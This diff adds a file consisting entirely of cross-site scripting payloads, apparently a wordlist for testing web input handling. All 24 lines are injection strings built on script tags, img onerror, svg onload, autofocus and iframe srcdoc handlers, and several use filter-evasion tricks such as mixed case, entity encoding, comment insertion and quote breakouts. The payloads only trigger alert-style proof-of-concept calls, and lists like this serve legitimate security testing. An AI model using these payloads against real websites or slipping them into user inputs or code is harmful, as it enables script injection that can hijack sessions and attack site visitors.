@@ -1,0 +1,24 @@
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=prompt(document.domain)>
+<img src=x onerror=confirm(1)>
+<img src="x" onerror="alert(1)">
+<img src=x onerror=alert(1)//>
+<img src=x onerror=alert/**/(1)>
+<img src=x onerror=(alert)(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert&#40;1&#41;>
+<svg xmlns="http://www.w3.org/2000/svg" onload=alert(1)>
+<svg onload=window['al'+'ert'](1)>
+<svg><script>alert(1)</script></svg>
+<input autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+><svg onload=alert(1)>
+<img src=x onerror=prompt(location.host)>
